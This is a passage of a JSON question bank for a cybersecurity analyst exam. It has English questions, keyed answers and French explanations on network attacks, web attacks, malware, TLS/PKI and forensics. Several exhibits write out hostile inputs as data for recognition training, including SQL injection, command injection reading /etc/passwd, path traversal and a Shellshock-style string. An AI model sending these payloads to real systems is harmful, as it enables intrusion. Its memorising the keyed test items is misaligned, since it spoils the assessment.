 (parade : DHCP snooping).","id":"2-027","d":2},{"t":"s","ref":"2.5","q":"What distinguishes a DDoS attack from a DoS attack?","o":["A DDoS attack always targets the application layer","A DDoS attack originates from many coordinated sources, typically a botnet of compromised hosts","A DoS attack requires spoofed addresses, a DDoS attack does not","A DDoS attack cannot be volumetric"],"a":[1],"e":"DoS = une source. **DDoS = sources multiples et coordonnées** (zombies / bots pilotés par un C2). Conséquence : bloquer une IP ne sert à rien, il faut du filtrage en amont (scrubbing, anycast, fournisseur anti-DDoS).","id":"2-028","d":2},{"t":"s","ref":"2.5","q":"Malware computes hundreds of pseudo-random domain names every day and tries them until one resolves to its command-and-control server. Which technique is this?","o":["Fast flux","DNS cache poisoning","Domain generation algorithm (DGA)","Domain shadowing"],"a":[2],"e":"**DGA** : le malware et l'attaquant partagent l'algorithme, donc bloquer un domaine ne suffit pas. Indice réseau : rafale de **NXDOMAIN** pour des noms aléatoires.","trap":"**Fast flux** = un même domaine dont les IP changent très vite (TTL courts). **Domain shadowing** = sous-domaines créés sur le compte volé d'un domaine légitime.","id":"2-029","d":2},{"t":"s","ref":"2.5","q":"Which attack lets an attacker send frames into a VLAN that the attacker's port does not belong to, by adding two 802.1Q tags?","o":["Switch spoofing","Double tagging","ARP poisoning","STP manipulation"],"a":[1],"e":"**Double tagging** : le premier switch retire le tag externe (celui du VLAN natif), le second lit le tag interne et livre la trame dans le VLAN cible. Attaque à sens unique. Parade : VLAN natif dédié et inutilisé, tag du VLAN natif.","trap":"**Switch spoofing** = l'attaquant négocie un trunk via DTP. Parade : `switchport mode access` et `switchport nonegotiate`.","id":"2-030","d":2},{"t":"s","ref":"2.6","q":"Refer to the exhibit. Which attack is being attempted?","o":["Cross-site scripting","SQL injection","Command injection","Directory traversal"],"a":[1],"e":"`' OR '1'='1'--` ferme la chaîne, ajoute une condition **toujours vraie** et commente le reste de la requête : **SQL injection**. Autres marqueurs : `UNION SELECT`, `; DROP TABLE`, `sleep(5)`.","x":"GET /products.php?id=10'%20OR%20'1'='1'--%20 HTTP/1.1\nHost: shop.example.com\nUser-Agent: sqlmap/1.8","id":"2-031","d":2},{"t":"s","ref":"2.6","q":"What is the most effective defense against SQL injection?","o":["Hiding database error messages from users","Encrypting the database files at rest","Using parameterized queries (prepared statements) together with input validation","Moving the web server to a nonstandard port"],"a":[2],"e":"Les **requêtes paramétrées** séparent le code SQL des données : l'entrée de l'utilisateur n'est jamais interprétée comme du SQL. La validation des entrées et le moindre privilège du compte SQL complètent.","id":"2-032","d":2},{"t":"s","ref":"2.6","q":"An attacker posts a comment that contains a <script> tag on a forum. Every visitor who views the page sends their session cookie to the attacker. Which attack is this?","o":["Reflected cross-site scripting","Stored cross-site scripting","Cross-site request forgery","SQL injection"],"a":[1],"e":"**Stored (persistent) XSS** : le script est **enregistré sur le serveur** et servi à tous les visiteurs. La victime de XSS est le **navigateur des autres utilisateurs**, pas le serveur.","trap":"**Reflected** XSS = le script est dans l'URL ou le paramètre et revient immédiatement dans la réponse : il faut faire cliquer la victime sur un lien piégé.","id":"2-033","d":2},{"t":"s","ref":"2.6","q":"Refer to the exhibit. A web form is supposed to ping a host. Which attack does the request illustrate?","o":["SQL injection","Cross-site scripting","Command injection","Buffer overflow"],"a":[2],"e":"Le `;` enchaîne une **commande système** supplémentaire (`cat /etc/passwd`) que le serveur exécute avec les droits de l'application web : **command injection**. Marqueurs : `;`, `|`, `&&`, backticks, `$( )`.","x":"POST /tools/ping.php HTTP/1.1\nHost: intranet.example.com\nContent-Type: application/x-www-form-urlencoded\n\nhost=8.8.8.8;cat /etc/passwd","id":"2-034","d":2},{"t":"s","ref":"2.6","q":"Which string in a web server log indicates a directory traversal attempt?","o":["<script>alert(1)<\/script>","' UNION SELECT user,pass FROM users--","../../../../etc/shadow","() { :; }; /bin/bash -c 'id'"],"a":[2],"e":"**Directory (path) traversal** : des `../` répétés pour sortir de la racine web et lire des fichiers système. Variantes encodées : `%2e%2e%2f`, `..%5c`.","id":"2-035","d":2},{"t":"s","ref":"2.7","q":"An email that appears to come from the company's law firm is sent only to the chief financial officer and asks for an urgent confidential wire transfer. Which type of attack is this?","o":["Phishing","Smishing","Whaling","Pharming"],"a":[2],"e":"**Whaling** = spear phishing visant un **dirigeant** (« gros poisson »). Phishing = envoi de masse. Spear phishing = ciblé sur une personne ou un groupe. Smishing = par SMS. Vishing = par téléphone.","id":"2-036","d":2},{"t":"s","ref":"2.7","q":"An attacker leaves USB flash drives labeled 'Salaries 2026' in the company parking lot. Which social engineering technique is this?","o":["Pretexting","Baiting","Quid pro quo","Tailgating"],"a":[1],"e":"**Baiting** = un **appât** physique ou numérique qui joue sur la curiosité. **Pretexting** = scénario inventé pour obtenir une info. **Quid pro quo** = un service en échange d'une info. **Tailgating / piggybacking** = entrer derrière quelqu'un.","id":"2-037","d":2},{"t":"s","ref":"2.7","q":"A finance employee receives a phone call in which the CEO's voice, cloned by an AI tool from public videos, orders an immediate payment. How is this attack best described?","o":["Smishing using a spoofed sender ID","Vishing enhanced with a generative-AI deepfake","Pharming through DNS poisoning","A watering-hole attack"],"a":[1],"e":"Vishing (voice phishing) + **deepfake audio** généré par IA. Point du blueprint v1.2 : l'IA générative rend l'ingénierie sociale plus crédible, plus personnalisée et industrialisable.","id":"2-038","d":2},{"t":"s","ref":"2.7","q":"How does generative AI change the detection of phishing emails?","o":["It makes phishing emails easier to spot because they all share the same writing style","Messages become grammatically correct and highly personalized at scale, so traditional clues such as spelling mistakes are no longer reliable","It prevents attackers from spoofing sender domains","It forces attackers to use attachments instead of links"],"a":[1],"e":"Les LLM produisent des messages **sans fautes**, dans la bonne langue, adaptés à la cible grâce à l'OSINT, et en masse. Les indices historiques (orthographe, tournures bizarres) ne suffisent plus : on s'appuie sur SPF, DKIM, DMARC, l'analyse des liens et du comportement, et des **procédures de vérification**.","id":"2-039","d":2},{"t":"s","ref":"2.7","q":"Which control is most effective against payment fraud that relies on deepfake voice or video?","o":["A stricter password policy","Blocking all international calls","An out-of-band verification procedure, such as calling back a known number, combined with dual approval for payments","Installing antivirus software on the phones of the finance team"],"a":[2],"e":"Face à un deepfake, la technique ne suffit pas : il faut un **processus**. Vérification hors bande sur un canal connu, double validation, et le droit de dire non à l'urgence. L'urgence et l'autorité sont les deux leviers classiques de l'ingénierie sociale.","id":"2-040","d":2},{"t":"s","ref":"2.8","q":"Which statement describes a buffer overflow attack?","o":["The attacker floods the network buffer of a switch with broadcast frames","A program writes more data to a memory buffer than it can hold, overwriting adjacent memory and possibly leading to arbitrary code execution","The attacker fills the disk with log files until the system stops","The attacker injects SQL statements into a form field"],"a":[1],"e":"Le débordement écrase la mémoire voisine (adresse de retour sur la pile) : au mieux un crash (DoS), au pire de l'**exécution de code**. Parades : contrôle des bornes, **ASLR**, **DEP/NX**, stack canaries.","id":"2-041","d":2},{"t":"s","ref":"2.8","q":"A workstation sends a small HTTPS request to the same external IP address every 60 seconds, day and night. Which activity does this pattern suggest?","o":["A port scan","Command-and-control (C2) beaconing","A SYN flood","A DHCP starvation attack"],"a":[1],"e":"**Beaconing** : l'implant « appelle la maison » à intervalle régulier pour chercher des ordres. Signes : périodicité, petite taille constante, destination rare, activité hors des heures de travail. Les implants ajoutent parfois du *jitter* pour casser la régularité.","id":"2-042","d":2},{"t":"s","ref":"2.8","q":"Which type of malware spreads across the network by itself, without requiring any user action or host file?","o":["Virus","Trojan horse","Worm","Rootkit"],"a":[2],"e":"**Worm** = auto-propagation en exploitant une vulnérabilité réseau (WannaCry et EternalBlue). **Virus** = a besoin d'un fichier hôte et d'une action de l'utilisateur. **Trojan** = se fait passer pour un logiciel légitime. **Rootkit** = se cache avec des privilèges élevés.","id":"2-043","d":2},{"t":"s","ref":"2.8","q":"Why is fileless malware difficult to detect with signature-based antivirus?","o":["It encrypts the master boot record","It runs in memory and abuses legitimate tools such as PowerShell or WMI, leaving few or no malicious files on disk to scan","It only infects Linux servers","It disables the network adapter"],"a":[1],"e":"**Fileless / living off the land** : pas de binaire malveillant sur disque, donc rien à comparer à une signature. Détection par le **comportement** (EDR), la journalisation PowerShell et la surveillance de WMI.","id":"2-044","d":2},{"t":"s","ref":"2.8","q":"Which measure gives an organization the best chance of recovering from a ransomware attack without paying the ransom?","o":["A host-based firewall on every workstation","Full-disk encryption","Regularly tested backups kept offline or immutable","A longer password policy"],"a":[2],"e":"Le ransomware chiffre aussi les sauvegardes accessibles en ligne : seules des sauvegardes **hors ligne ou immuables**, **testées**, garantissent la restauration. Double extorsion : l'attaquant exfiltre avant de chiffrer, donc la sauvegarde ne règle pas la fuite.","id":"2-045","d":2},{"t":"s","ref":"2.9","q":"An attacker splits a malicious payload into many small IP fragments so that the IDS cannot match its signature. Which evasion technique is used?","o":["Traffic substitution","Traffic fragmentation","Pivoting","Resource exhaustion"],"a":[1],"e":"**Fragmentation** : la signature est découpée sur plusieurs fragments. Si l'IDS ne réassemble pas (ou pas comme l'hôte cible), il ne voit rien. Variante : fragments qui se chevauchent.","id":"2-046","d":2},{"t":"s","ref":"2.9","q":"After compromising a web server in the DMZ, an attacker uses it as a relay to reach hosts on the internal network that are not reachable from the internet. Which technique is this?","o":["Traffic insertion","Encryption","Pivoting","Protocol-level misinterpretation"],"a":[2],"e":"**Pivoting** = rebondir depuis une machine compromise pour atteindre d'autres segments (mouvement latéral). Les flux viennent alors d'une source interne *légitime*, donc plus difficiles à repérer.","id":"2-047","d":2},{"t":"s","ref":"2.9","q":"An attacker encodes a payload with Unicode characters instead of ASCII so that the IDS signature no longer matches, while the target application still interprets it the same way. Which technique is this?","o":["Resource exhaustion","Traffic substitution","Traffic fragmentation","Tunneling"],"a":[1],"e":"**Traffic substitution** : on remplace les données par un **équivalent** (autre encodage, tabulation à la place d'un espace) qui a le même sens pour la cible. **Traffic insertion** : on ajoute des octets que l'IDS lit mais que la cible ignore.","id":"2-048","d":2},{"t":"s","ref":"2.9","q":"An attacker generates a huge volume of noisy, harmless-looking events so that the IPS and the analysts cannot keep up, then launches the real attack. Which evasion technique is this?","o":["Pivoting","Proxying","Resource exhaustion","Rootkit installation"],"a":[2],"e":"**Resource exhaustion** : saturer le capteur (CPU, mémoire) ou l'équipe (avalanche d'alertes) pour que la vraie attaque passe dans le bruit.","id":"2-049","d":2},{"t":"m","ref":"2.9","q":"Which two techniques hide the content or the true origin of malicious traffic from network security monitoring? (Choose two.)","o":["Encrypting the C2 channel with TLS","Sending traffic during business hours only","Relaying connections through a chain of anonymizing proxies","Using the default TTL of the operating system","Setting the DF bit in the IP header"],"a":[0,2],"e":"**Chiffrement** = contenu illisible. **Proxies / Tor / VPN** = origine réelle masquée. Les trois autres propositions ne cachent ni le contenu ni la source.","id":"2-050","d":2},{"t":"s","ref":"2.10","q":"In a PKI, which entity issues and digitally signs certificates?","o":["Registration authority (RA)","Certificate authority (CA)","OCSP responder","Certificate subject"],"a":[1],"e":"La **CA** émet et **signe** les certificats avec sa clé privée. La **RA** vérifie l'identité des demandeurs pour le compte de la CA, mais ne signe pas. Le répondeur OCSP donne l'état de révocation.","id":"2-051","d":2},{"t":"s","ref":"2.10","q":"Which key does a client use to verify the signature on a server certificate?","o":["The private key of the server","The public key of the server","The private key of the issuing CA","The public key of the issuing CA"],"a":[3],"e":"La CA signe avec sa **clé privée** ; n'importe qui vérifie avec la **clé publique de la CA**, présente dans le certificat racine ou intermédiaire du magasin de confiance.","trap":"Signature = privée pour signer, publique pour vérifier. Chiffrement = publique pour chiffrer, privée pour déchiffrer.","id":"2-052","d":2},{"t":"s","ref":"2.10","q":"During a TLS handshake, which statement about keys crossing the network is true?","o":["The server sends its private key so the client can decrypt the session","The CA private key is included in the certificate chain","The server's public key crosses the network inside its certificate, while private keys never leave their owners","Both peers exchange their private keys, protected by a hash"],"a":[2],"e":"Seules les **clés publiques** circulent (dans les certificats). Les clés privées ne quittent **jamais** leur propriétaire. La clé de session symétrique est soit dérivée (ECDHE), soit envoyée chiffrée avec la clé publique du serveur (RSA, obsolète).","id":"2-053","d":2},{"t":"s","ref":"2.10","q":"Why does TLS switch to symmetric encryption for the bulk of the session after the handshake?","o":["Symmetric algorithms provide non-repudiation","Asymmetric algorithms cannot encrypt more than 1 KB","Symmetric encryption is much faster and less CPU-intensive than asymmetric encryption","Symmetric keys never need to be exchanged"],"a":[2],"e":"**Asymétrique** = lent, sert à l'authentification et à l'échange de clés. **Symétrique** (AES, ChaCha20) = rapide, sert au trafic. TLS combine les deux : c'est le chiffrement hybride.","id":"2-054","d":2},{"t":"s","ref":"2.10","q":"Which mechanism lets a client check in real time whether one specific certificate has been revoked, without downloading a full list?","o":["CRL","OCSP","CSR","PKCS #12"],"a":[1],"e":"**OCSP** = requête en temps réel sur **un** certificat (identifié par son numéro de série). **CRL** = liste complète publiée périodiquement, potentiellement lourde et en retard.","id":"2-055","d":2},{"t":"s","ref":"2.10","q":"An organization deploys TLS decryption on its proxy with an internal CA trusted by all workstations. What is the effect on security monitoring?","o":["It removes the need for endpoint protection","Inspection tools regain visibility into encrypted web traffic, at the cost of managing privacy, performance and certificate trust","It makes server certificates unnecessary","It prevents attackers from using HTTPS"],"a":[1],"e":"Le proxy fait un **MITM volontaire** : il re-signe les certificats avec la CA interne, ce qui rend le contenu inspectable (IPS, DLP, antimalware). Points d'attention : vie privée, catégories exclues (banque, santé), certificate pinning, charge CPU.","trap":"Un cadenas ou un certificat valide ne dit rien de l'honnêteté du site : les attaquants obtiennent aussi des certificats valides pour leurs sites de phishing et leurs C2.","id":"2-056","d":2},{"t":"d","ref":"2.11","q":"Refer to the exhibit. Drag and drop each part of the cipher suite onto its function.","l":["ECDHE","RSA","AES_128_GCM","SHA256"],"r":["Key exchange","Server authentication","Bulk (symmetric) encryption","Hash used for message integrity / PRF"],"a":[0,1,2,3],"e":"Lecture d'une suite TLS 1.2 : `TLS_<échange de clés>_<authentification>_WITH_<chiffrement>_<hash>`. Ici : ECDHE pour l'échange, RSA pour authentifier le serveur, AES-128-GCM pour chiffrer les données, SHA-256 pour l'intégrité et la dérivation.","trap":"En TLS 1.3, les suites sont raccourcies (`TLS_AES_256_GCM_SHA384`) : l'échange de clés est toujours éphémère (ECDHE) et n'apparaît plus dans le nom.","x":"Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)","id":"2-057","d":2},{"t":"s","ref":"2.11","q":"Refer to the exhibit. Which weakness does the negotiated cipher suite introduce?","o":["The session is not encrypted","The server is not authenticated","There is no forward secrecy: if the server's private key is compromised later, recorded sessions can be decrypted","The hash function is used as the encryption algorithm"],"a":[2],"e":"`TLS_RSA_WITH_…` = échange de clés **RSA statique** : la clé de session est chiffrée avec la clé publique du serveur. Celui qui vole la clé privée plus tard peut déchiffrer tout le trafic enregistré. **(EC)DHE** apporte la *forward secrecy*.","x":"TLSv1.2 Record Layer: Handshake Protocol: Server Hello\n    Version: TLS 1.2 (0x0303)\n    Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)","id":"2-058","d":2},{"t":"s","ref":"2.11","q":"Which X.509 field or extension lists the additional host names for which a certificate is valid?","o":["Issuer","Serial Number","Subject Alternative Name","Key Usage"],"a":[2],"e":"**SAN (Subject Alternative Name)** = les noms DNS et IP couverts ; les navigateurs modernes ignorent le CN au profit du SAN. **Issuer** = qui a signé. **Serial Number** = identifiant unique chez la CA (utilisé par les CRL et OCSP). **Validity** = Not Before / Not After.","id":"2-059","d":2},{"t":"d","ref":"2.11","q":"Drag and drop each PKCS standard onto its purpose.","l":["PKCS #10","PKCS #12","PKCS #7","PKCS #1"],"r":["Certificate signing request (CSR) sent to a CA","Password-protected bundle holding a certificate and its private key (.pfx / .p12)","Container for certificates and chains, without the private key (.p7b)","RSA cryptography standard"],"a":[0,1,2,3],"e":"À retenir en priorité : **#10 = CSR**, **#12 = certificat + clé privée** (export et import, .pfx), **#7 = chaîne de certificats sans clé privée**. PKCS #8 = format de stockage d'une clé privée.","id":"2-060","d":2},{"t":"m","ref":"2.11","q":"Which two protocol versions are considered acceptable for securing web traffic today? (Choose two.)","o":["SSL 3.0","TLS 1.0","TLS 1.1","TLS 1.2","TLS 1.3"],"a":[3,4],"e":"SSL 2.0 et 3.0, TLS 1.0 et 1.1 sont **dépréciés** (POODLE, BEAST ; RFC 8996). Restent **TLS 1.2** (avec des suites AEAD et ECDHE) et **TLS 1.3**. Voir « SSLv3 » ou « TLS 1.0 » dans un Server Hello est un signal d'alerte.","id":"2-061","d":2},{"t":"s","ref":"2.11","q":"Which statement about TLS 1.3 is correct?","o":["It still supports static RSA key exchange for compatibility","It removed static RSA key exchange and CBC-mode ciphers, so every session uses ephemeral key exchange and AEAD encryption","It sends the server certificate in clear text like TLS 1.2","It requires two additional round trips compared with TLS 1.2"],"a":[1],"e":"TLS 1.3 : **forward secrecy obligatoire** (ECDHE), uniquement des chiffrements **AEAD** (AES-GCM, ChaCha20-Poly1305), handshake en **1-RTT**, et certificat du serveur **chiffré** : encore moins de visibilité pour l'inspection passive.","id":"2-062","d":2},{"t":"s","ref":"3.1","q":"Which function is characteristic of a host-based intrusion detection system (HIDS)?","o":["It blocks malicious packets inline between two VLANs","It monitors activity on the host itself, such as file integrity, logs, registry changes and running processes, and raises alerts","It assigns IP addresses to endpoints","It decrypts TLS traffic for the whole network"],"a":[1],"e":"Le **HIDS** vit sur l'hôte : intégrité des fichiers (hash des fichiers système), journaux, registre, processus. Exemples : OSSEC, Wazuh, Tripwire. Il voit ce que le réseau ne voit pas, notamment le trafic une fois **déchiffré** sur la machine.","id":"3-001","d":3},{"t":"s","ref":"3.1","q":"An endpoint product identifies a malicious file by comparing its hash and byte patterns with a database of known threats. Which detection method is this?","o":["Behavior-based","Heuristic","Signature-based","Predictive AI"],"a":[2],"e":"**Signature-based** = comparaison avec du **connu** (hash, motifs d'octets). Rapide et fiable sur le connu, inefficace contre le polymorphe et le zero-day.","id":"3-002","d":3},{"t":"s","ref":"3.1","q":"What is the difference between heuristic and behavior-based malware detection?","o":["They are two names for signature matching","Heuristics look for general code characteristics shared by families of malware, whereas behavior-based detection evaluates what a program actually does when it runs","Heuristics require the file to be executed, behavior-based detection does not","Behavior-based detection only works on Linux"],"a":[1],"e":"**Heuristic** = caractéristiques suspectes *dans le code* (structure, instructions typiques d'une famille). **Behavior-based** = *actions* observées à l'exécution (chiffrement en masse, injection dans un autre processus).","id":"3-003","d":3},{"t":"s","ref":"3.1","q":"An endpoint agent uses a machine-learning model, trained on millions of benign and malicious samples, to score a never-seen-before file before it executes. What is the main benefit of this predictive AI approach?","o":["It guarantees zero false positives","It removes the need to retrain or update the model","It can block unknown or polymorphic malware for which no signature exists","It works only when the endpoint is offline"],"a":[2],"e":"Blueprint v1.2 : **rules, signatures, and predictive AI**. Le modèle **prédit** la malveillance à partir des caractéristiques du fichier, même inconnu. Limites : faux positifs, dérive du modèle, attaques adverses, besoin de données d'entraînement de qualité et d'une validation humaine.","trap":"Une réponse qui promet « zéro faux positif » ou « plus besoin d'analyste » est toujours fausse.","id":"3-004","d":3},{"t":"s","ref":"3.1","q":"Which statement describes a host-based firewall?","o":["It replaces the perimeter firewall for the whole organization","It filters inbound and outbound connections of a single host and keeps protecting that host when it is outside the corporate network","It only inspects traffic between virtual machines","It can only filter by MAC address"],"a":[1],"e":"Pare-feu **local** (Windows Defender Firewall, iptables / nftables) : règles par port, protocole et **application**, et protection qui suit le portable hors du réseau d'entreprise. Il limite aussi le mouvement latéral entre postes.","id":"3-005","d":3},{"t":"s","ref":"3.1","q":"Only applications that are explicitly approved are allowed to run on a kiosk computer. Which approach is this?","o":["Block listing","Application allow listing","Sandboxing","Heuristic analysis"],"a":[1],"e":"**Allow listing** = tout est interdit sauf ce qui est approuvé (*default deny*) : plus sûr, plus lourd à administrer. **Block listing** = tout est permis sauf le connu-mauvais : plus souple, mais aveugle à l'inconnu.","id":"3-006","d":3},{"t":"s","ref":"3.2","q":"Malware creates a value under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. What is the purpose of this action?","o":["To hide the process from Task Manager","To persist: the program starts automatically at each logon, for every user of the machine","To disable the Windows firewall","To clear the Security event log"],"a":[1],"e":"Les clés **Run** lancent un programme à l'ouverture de session. Sous **HKLM** = toute la machine, tous les utilisateurs (droits admin requis). Sous **HKCU** = l'utilisateur courant seulement. C'est la persistance la plus classique.","id":"3-007","d":3},{"t":"d","ref":"3.2","q":"Drag and drop each Windows registry hive onto its content.","l":["HKEY_LOCAL_MACHINE (HKLM)","HKEY_CURRENT_USER (HKCU)","HKEY_USERS (HKU)","HKEY_CLASSES_ROOT (HKCR)"],"r":["Machine-wide configuration: hardware, software, services","Settings of the user who is currently logged on","Profiles of all users loaded on the machine","File associations and COM object registration"],"a":[0,1,2,3],"e":"HKLM = la machine. HKCU = l'utilisateur courant (c'est un alias vers une branche de HKU). HKU = tous les profils chargés. HKCR = associations de fichiers et objets COM. HKCC = profil matériel courant.","id":"3-008","d":3},{"t":"s","ref":"3.2","q":"In Windows, what is a thread?","o":["A reference that a process uses to access a file or registry key","The basic unit of execution to which the operating system allocates processor time; a process contains one or more threads","A background program with no user interface that starts at boot","A reserved region of virtual memory"],"a":[1],"e":"**Process** = un programme en cours, avec son espace mémoire. **Thread** = l'unité d'exécution planifiée par le CPU ; les threads d'un processus partagent sa mémoire. **Handle** = la référence vers une ressource (fichier, clé de registre). **Service** = programme d'arrière-plan sans interface.","id":"3-009","d":3},{"t":"s","ref":"3.2","q":"Which Windows command shows the active TCP connections together with the PID of the owning process?","o":["ipconfig /all","netstat -ano","net user","tasklist /svc"],"a":[1],"e":"`netstat -ano` : **a**ll connections, **n**umeric, **o**wning PID. On recoupe ensuite le PID avec `tasklist /FI \"PID eq 1234\"` ou `Get-Process -Id`. `netstat -anob` affiche directement l'exécutable (droits admin).","id":"3-010","d":3},{"t":"s","ref":"3.2","q":"Which NTFS feature can an attacker abuse to hide a payload inside an innocent-looking file without changing its visible size in Explorer?","o":["The master file table","Alternate data streams","The journaling log","Volume shadow copies"],"a":[1],"e":"Les **ADS** attachent des flux cachés à un fichier (`notes.txt:payload.exe`). Invisibles dans l'Explorateur ; on les liste avec `dir /r` ou `Get-Item -Stream *`.","id":"3-011","d":3},{"t":"s","ref":"3.2","q":"Which Windows component lets administrators, and attackers, query and manage local or remote systems, and is frequently abused for fileless persistence and lateral movement?","o":["NTFS","Windows Management Instrumentation (WMI)","The Windows Registry Editor","BitLocker"],"a":[1],"e":"**WMI** : interrogation et exécution à distance, abonnements à des événements (persistance sans fichier). Très prisé des attaques *living off the land*, avec PowerShell.","id":"3-012","d":3},{"t":"s","ref":"3.2","q":"On a Linux system, which file stores the hashed passwords of local accounts and is readable only by root?","o":["/etc/passwd","/etc/shadow","/etc/group","/var/log/auth.log"],"a":[1],"e":"`/etc/passwd` = liste des comptes (UID, GID, home, shell), **lisible par tous**, sans mot de passe (un `x` renvoie vers shadow). `/etc/shadow` = **hashs** et politique d'expiration, réservé à root.","id":"3-013","d":3},{"t":"s","ref":"3.2","q":"Refer to the exhibit. Why should this file draw the attention of an analyst?","o":["It is world-writable","It has no owner","The SUID bit is set on a root-owned binary in a temporary directory, so any user who runs it gets root privileges","It is a symbolic link to /etc/shadow"],"a":[2],"e":"Le `s` à la place du `x` du propriétaire = **SUID** : le programme s'exécute avec les droits du **propriétaire (root)**. Un binaire SUID root dans `/tmp` est un indicateur classique d'**élévation de privilèges** ou de backdoor. Recherche : `find / -perm -4000`.","x":"-rwsr-xr-x 1 root root 1183448 Feb 11 03:12 /tmp/.cache/bash","id":"3-014","d":3},{"t":"s","ref":"3.2","q":"Which octal value corresponds to the Linux permissions rwxr-x--- ?","o":["640","750","755","770"],"a":[1],"e":"r=4, w=2, x=1. Propriétaire rwx = **7**, groupe r-x = **5**, autres --- = **0**. Donc **750**.","id":"3-015","d":3},{"t":"s","ref":"3.2","q":"On a Linux server running systemd, which process has PID 1?","o":["The kernel scheduler","The first user's login shell","The init process (systemd), ancestor of all other processes","The SSH daemon"],"a":[2],"e":"**PID 1 = init / systemd** : premier processus lancé par le noyau, parent de tous les autres. Les processus naissent par `fork`. Un **daemon** est un processus d'arrière-plan sans terminal.","id":"3-016","d":3},{"t":"s","ref":"3.2","q":"Which Linux command lists the listening TCP and UDP ports together with the process that owns each socket?","o":["ps aux","ss -tulpn","chmod -R","cat /etc/services"],"a":[1],"e":"`ss -tulpn` (ou l'ancien `netstat -tulpn`) : **t**cp, **u**dp, **l**istening, **p**rocess, **n**umeric. `lsof -i` fait aussi le lien entre socket et processus. C'est la base du *server profiling* (5.8).","id":"3-017","d":3},{"t":"s","ref":"3.2","q":"A syslog message has the severity level 2. What does this level mean?","o":["Emergency","Alert","Critical","Error"],"a":[2],"e":"0 Emergency, 1 Alert, **2 Critical**, 3 Error, 4 Warning, 5 Notice, 6 Informational, 7 Debug. Plus le chiffre est **petit**, plus c'est **grave**.","trap":"Mnémo : « **E**very **A**lley **C**at **E**ats **W**atery **N**oodles **I**n **D**oors ».","id":"3-018","d":3},{"t":"s","ref":"3.3","q":"Which item is an indicator of compromise (IoC)?","o":["The SHA-256 hash of a known malicious file found on a disk","An Office document launching PowerShell, which then connects to an external host","A user browsing a news site","A planned vulnerability scan"],"a":[0],"e":"**IoC** = un **artefact** qui prouve qu'une compromission **a eu lieu** : hash, IP ou domaine malveillant, clé de registre, nom de fichier. Statique, réactif, facile à partager et à chercher.","id":"3-019","d":3},{"t":"s","ref":"3.3","q":"What is the main difference between an indicator of attack (IoA) and an indicator of compromise (IoC)?","o":["An IoA is always a file hash, an IoC is always an IP address","An IoA focuses on the attacker's behavior and intent while the attack is unfolding, whereas an IoC is forensic evidence that a compromise has already occurred","An IoA can only be produced by a firewall","There is no difference; the terms are interchangeable"],"a":[1],"e":"**IoA** = **comportement et intention**, quel que soit l'outil utilisé (exécution de code, persistance, mouvement latéral) : proactif, résiste aux changements de hash. **IoC** = trace laissée **après coup**.","trap":"Mnémo : Io**A** = **A**ction en cours. Io**C** = **C**'est déjà arrivé.","id":"3-020","d":3},{"t":"s","ref":"3.3","q":"Why is attributing an attack to a specific threat actor difficult?","o":["Threat actors always use their own IP addresses","Attackers relay through proxies and compromised hosts, reuse tools shared by other groups, and plant false flags","Malware never contains any artifacts","Logs cannot be used as evidence"],"a":[1],"e":"L'attribution repose sur un faisceau : **TTP**, infrastructure, artefacts du malware, fuseaux horaires, langue. Mais tout peut être imité ou détourné : rebonds, outils publics, *false flags*. D'où la prudence.","id":"3-021","d":3},{"t":"s","ref":"3.3","q":"In the context of an investigation, what does the term 'asset' refer to?","o":["Only the financial value of the stolen data","Anything of value to the organization that must be protected, such as systems, data, people and services","The tools used by the attacker","The list of CVEs published this year"],"a":[1],"e":"**Asset** = tout ce qui a de la valeur pour l'organisation. En attribution, on identifie **quels assets ont été touchés** et leur criticité, ce qui pilote la priorité et le périmètre de l'incident.","id":"3-022","d":3},{"t":"s","ref":"3.3","q":"Which practice is essential for maintaining the chain of custody of digital evidence?","o":["Letting every team member work on the original disk to save time","Documenting every person who handled the evidence, with the date, time, purpose and storage location of each transfer","Deleting the hash values once the image has been created","Storing the evidence on a shared network drive"],"a":[1],"e":"**Chain of custody** = traçabilité ininterrompue : qui a collecté, quand, comment, qui a transféré à qui, où c'est stocké. Sans elle, la preuve peut être rejetée au tribunal.","id":"3-023","d":3},{"t":"s","ref":"3.3","q":"An analyst creates a forensic image of a suspect's disk. How can the analyst prove that the image is identical to the original and has not been altered?","o":["By comparing the file names on both disks","By checking that both disks have the same capacity","By computing a cryptographic hash of the original and of the image and verifying that they match","By compressing the image with a password"],"a":[2],"e":"Hash (SHA-256) de l'original et de la copie, à l'acquisition puis à chaque vérification. Si le hash diffère, l'image a été **altérée**. On acquiert derrière un **write blocker** et on travaille toujours sur une **copie**.","id":"3-024","d":3},{"t":"d","ref":"3.4","q":"Drag and drop each piece of evidence onto its type.","l":["The suspect's original hard drive, preserved and proven unaltered","Firewall logs that support the conclusion already drawn from the hard drive","Proof that the suspect researched 'how to erase logs' the week before","A colleague who personally watched the suspect copy the files"],"r":["Best evidence","Corroborative evidence","Indirect evidence","Direct evidence"],"a":[0,1,2,3],"e":"**Best** = l'original, dans son état d'origine. **Corroborative** = vient **appuyer** une conclusion tirée de la meilleure preuve. **Indirect (circumstantial)** = combinée à d'autres faits, soutient une hypothèse sans prouver directement. **Direct** = témoin oculaire ou élément indiscutablement en possession de l'accusé.","id":"3-025","d":3},{"t":"s","ref":"3.4","q":"An investigation concludes from a seized laptop that an employee exfiltrated files. Proxy logs showing uploads from that laptop to a cloud storage site at the same time are then added to the case. What type of evidence are the proxy logs?","o":["Best evidence","Corroborative evidence","Indirect evidence","Hearsay"],"a":[1],"e":"Les logs proxy **confirment** ce que la preuve principale (le portable) établit déjà : preuve **corroborative**.","id":"3-026","d":3},{"t":"s","ref":"3.4","q":"Which statement describes indirect evidence?","o":["Evidence in its original, unaltered state","Testimony from someone who witnessed the act","Evidence that, combined with other facts, supports a hypothesis without proving the act directly","A bit-for-bit copy validated by hash"],"a":[2],"e":"**Indirect = circumstantial** : elle ne prouve pas l'acte, elle rend l'hypothèse plausible (mobile, comportement antérieur, présence sur les lieux).","id":"3-027","d":3},{"t":"s","ref":"3.4","q":"Which type of evidence is considered the most reliable in court?","o":["Corroborative evidence","Indirect evidence","Best evidence","Circumstantial evidence"],"a":[2],"e":"La **best evidence** est l'original non altéré (ou une archive dont l'intégrité est prouvée). Tout le reste vient en soutien.","id":"3-028","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. Which event do these Windows Security log entries most likely describe?","o":["A user who forgot a password and then remembered it","A successful password-guessing attack over the network against the svc_backup account","A Kerberos 